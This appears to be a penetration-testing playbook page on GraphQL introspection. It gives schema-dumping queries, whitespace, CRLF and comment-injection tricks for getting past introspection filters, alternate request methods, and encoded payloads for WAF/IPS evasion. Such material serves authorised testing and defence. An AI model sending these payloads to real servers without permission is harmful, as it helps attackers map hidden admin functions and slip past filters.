# GraphQL Introspection (and Filter Bypass)

## When this applies

- Endpoint discovered. You need the schema (queries, mutations, types, args) to plan attacks.
- Production servers often disable introspection — try bypasses (whitespace, encoding, alternate methods).
- If introspection is fully blocked, fall back to schema reconstruction (Clairvoyance — see `schema-reconstruction.md`).

## Technique

Issue the canonical introspection query. If blocked, inject whitespace / URL-encoded characters between `__schema` and `{`, or switch to GET / different Content-Type.

## Steps

### Full schema introspection

```graphql
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          description
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
          defaultValue
        }
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        isDeprecated
        deprecationReason
      }
    }
    directives {
      name
      description
      locations
      args {
        name
        description
        type {
          name
          kind
        }
      }
    }
  }
}
```

### Minimal introspection

```graphql
# List all types
{__schema{types{name}}}

# List all queries
{__schema{queryType{fields{name}}}}

# List all mutations
{__schema{mutationType{fields{name}}}}

# Get specific type details
{__type(name:"User"){fields{name type{name}}}}
```

### Query-specific introspection

```graphql
# Get all fields of Query type
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
        type {
          name
          kind
        }
      }
    }
  }
}

# Get all fields of Mutation type
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

### Introspection bypasses

```graphql
# Newline injection (most common)
{__schema
{types{name}}}

# URL-encoded newline
{__schema%0A{types{name}}}

# Space injection
{__schema {types{name}}}

# URL-encoded space
{__schema%20{types{name}}}

# Tab injection
{__schema	{types{name}}}

# URL-encoded tab
{__schema%09{types{name}}}

# Carriage return
{__schema%0D{types{name}}}

# CRLF injection
{__schema%0D%0A{types{name}}}

# Multiple newlines
{__schema


{types{name}}}

# Comment injection
{__schema#comment
{types{name}}}

# Mixed whitespace
{__schema%20%0A%09{types{name}}}
```

### Alternative HTTP methods

```http
# POST with JSON (standard)
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{types{name}}}"}

# GET with query parameter
GET /graphql?query={__schema{types{name}}} HTTP/1.1

# POST with URL-encoded
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query={__schema{types{name}}}

# POST with GraphQL content-type
POST /graphql HTTP/1.1
Content-Type: application/graphql

{__schema{types{name}}}
```

### Common filter patterns to bypass

```regex
__schema\{
__type\(
__Schema
__Type
```

### Case variations (rarely works)

```graphql
{__Schema{types{name}}}
{__SCHEMA{types{name}}}
```

### WAF/IPS evasion

**URL encoding:**
```
%7B__schema%7Btypes%7Bname%7D%7D%7D
```

**Double URL encoding:**
```
%257B__schema%257Btypes%257Bname%257D%257D%257D
```

**Unicode encoding:**
```
{__schema{types{name}}}
```

## Verifying success

- Response contains a `types` array with type names visible (User, Post, Query, Mutation).
- Each type has a `fields` array with field names and argument types.
- Hidden / admin types appear (`AdminUser`, `InternalReport`) that aren't reachable via the UI.

## Common pitfalls

- Some servers return errors but include the schema in the error path — always read the full response body.
- Apollo Server's "field suggestions" can leak field names even with introspection disabled — check error messages for `"Did you mean ..."`.
- Long introspection queries may exceed body-size limits — use the minimal variant if 413 errors occur.

## Tools

- Burp Suite Repeater (paste introspection query)
- Burp InQL Scanner BApp
- Clairvoyance (reconstruct schema when introspection is fully blocked)
- GraphQL Voyager (visualize schema)
